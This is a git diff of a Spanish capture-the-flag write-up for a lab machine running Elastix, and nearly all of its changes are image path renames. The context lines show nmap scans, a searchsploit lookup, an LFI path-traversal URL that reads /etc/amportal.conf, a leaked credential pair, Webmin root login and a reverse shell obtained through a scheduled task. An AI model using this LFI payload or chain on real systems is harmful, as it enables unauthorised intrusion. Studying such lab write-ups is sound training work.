@@ -14,7 +14,7 @@ ping -c 1 10.10.10.7
 
 para verificar la conectividad de red.
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 A continuación, realizamos el comando:
 
@@ -24,7 +24,7 @@ nmap -sC -sV 10.10.10.7
 
 para realizar un escaneo de puertos y servicios detallado en la dirección IP.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Durante el escaneo se identificaron los siguientes puertos abiertos:
 
@@ -50,11 +50,11 @@ sudo nmap -sCV -p22,25,80,443,110,995,143,993,3306,4445,10000 -v 10.10.10.7
 
 para que nos proporcione más información sobre esos puertos específicamente.
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Miramos el puerto 80.
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 🚀 **EXPLOTACIÓN**
 
@@ -64,7 +64,7 @@ Probamos credenciales por defecto pero no hay resultado. Vamos a ver si **Elasti
 searchsploit elastix
 ```
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vemos que tenemos una vulnerabilidad **LFI** por lo que la explotamos. Descargamos el archivo.
 
@@ -74,7 +74,7 @@ searchsploit -m php/webapps/37637.pl
 
 Vemos el contenido.
 
-<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Observamos el exploit LFI que tiene por lo que es lo que hacemos a continuación.
 
@@ -82,11 +82,11 @@ Observamos el exploit LFI que tiene por lo que es lo que hacemos a continuación
 https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
 ```
 
-<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Al parecer aparecen unas credenciales.
 
-<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 admin:jEhdIekWmdjE
@@ -96,11 +96,11 @@ Nos intentamos loguear con esas credenciales en el servicio **Webmin**.&#x20;
 
 > Nota: las credenciales son root como usuario y misma contraseña.
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Podemos ejecutar una tarea como root y eso hacemos para una Reverse Shell.
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 🔐 **PRIVILEGIOS**
 
@@ -110,7 +110,7 @@ Al estar dentro y ejecutar:
 whoami
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ya somos **root**.
 
